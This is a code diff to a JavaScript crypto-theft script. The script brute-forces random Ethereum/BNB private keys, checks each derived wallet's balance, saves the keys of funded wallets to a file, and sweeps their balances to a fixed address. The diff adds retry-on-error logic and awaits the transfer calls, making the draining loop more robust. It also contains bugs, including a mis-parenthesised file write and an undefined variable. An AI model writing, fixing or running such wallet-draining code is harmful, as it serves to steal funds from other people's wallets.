@@ -9,28 +9,38 @@ const genRanHex = (size) =>
   [...Array(size)]
     .map(() => Math.floor(Math.random() * 16).toString(16))
     .join("");
+const sleep = (ms) =>
+  new Promise((resolve) => {
+    setTimeout(resolve, ms);
+  });
 
 const main = async () => {
-  while (true) {
-    const privateKey = genRanHex(64);
-    const address = web3.eth.accounts.privateKeyToAccount(privateKey).address;
-    const balance = await web3.eth.getBalance(address);
-    // const balanceEther = await web3Ether.eth.getBalance(address);
-    // if (balance > 0 || balanceEther > 0) {
-    if (balance > 0) {
-      console.log(privateKey, balance, balanceEther);
-      fs.appendFileSync(
-        "privateKeys.txt",
-        privateKey + balance > 0 ? " bnb" : " eth" + "\n"
-      );
-      web3.eth.accounts.wallet.add({
-        privateKey,
-        address,
-      });
-      sendEther(address, balance);
-    } else {
-      console.log(address, "no balance");
+  try {
+    while (true) {
+      const privateKey = genRanHex(64);
+      const address = web3.eth.accounts.privateKeyToAccount(privateKey).address;
+      const balance = await web3.eth.getBalance(address);
+      // const balanceEther = await web3Ether.eth.getBalance(address);
+      // if (balance > 0 || balanceEther > 0) {
+      if (balance > 0) {
+        console.log(privateKey, balance, balanceEther);
+        fs.appendFileSync(
+          "privateKeys.txt",
+          privateKey + balance > 0 ? " bnb" : " eth" + "\n"
+        );
+        web3.eth.accounts.wallet.add({
+          privateKey,
+          address,
+        });
+        await sendEther(address, balance);
+      } else {
+        console.log(address, "no balance");
+      }
     }
+  } catch (error) {
+    console.error(error.message);
+    await sleep(3000);
+    await main();
   }
 };
 
@@ -40,7 +50,7 @@ const sendEther = async (from, balance) => {
   const sendAmount = parseFloat(balance) - parseFloat(gas);
 
   console.log(sendAmount);
-  const tx = web3.eth.sendTransaction({
+  const tx = await web3.eth.sendTransaction({
     from: from,
     to: to,
     gas: "21000",
